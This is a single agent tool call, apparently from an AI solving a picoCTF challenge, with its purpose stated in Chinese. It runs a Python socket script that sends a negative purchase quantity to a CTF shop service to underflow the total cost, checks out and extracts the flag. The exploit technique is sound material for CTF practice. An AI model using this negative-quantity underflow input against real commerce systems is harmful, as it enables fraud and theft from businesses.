- 命令: {"tool": "sandbox_python_exec", "purpose": "编写并执行Python脚本，通过socket发送精心构造的交互序列，利用整数下溢漏洞使总花费下溢为极大正数，然后结账触发flag输出。", "arguments": {"code": "import socket\nimport time\nimport re\n\ndef solve():\n    host = 'wily-courier.picoctf.net'\n    port = 63823\n    \n    # 构造交互序列\n    # 1. 发送购买选项 '1' (Average Apple, price 15)\n    # 2. 发送数量 '-10000' (导致总花费下溢)\n    # 3. 发送结账选项 '5'\n    # 4. 发送退出选项 '0' (以防万一)\n    commands = [\n        b'1\\n',\n        b'-10000\\n',\n        b'5\\n'\n    ]\n    \n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(10)\n        s.connect((host, port))\n        \n        # 接收初始菜单\n        data = s.recv(4096)\n        # print(f\"Initial: {data.decode()}\")\n        \n        for cmd in commands:\n            s.sendall(cmd)\n            time.sleep(0.5)\n            data = s.recv(8192)\n            # print(f\"Response: {data.decode()}\")\n            \n        # 接收剩余输出\n        time.sleep(1)\n        try:\n            while True:\n                chunk = s.recv(4096)\n                if not chunk: break\n                data += chunk\n        except socket.timeout:\n            pass\n            \n        s.close()\n        \n        output = data.decode(errors='ignore')\n        print(output)\n        \n        # 提取 flag\n        flag_match = re.search(r'picoCTF\\{[^}]+\\}', output)\n        if flag_match:\n            print(f\"\\n[SUCCESS] Flag found: {flag_match.group(0)}\")\n        else:\n            print(\"\\n[FAILURE] Flag not found in output.\")\n            \n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    solve()\n"}}
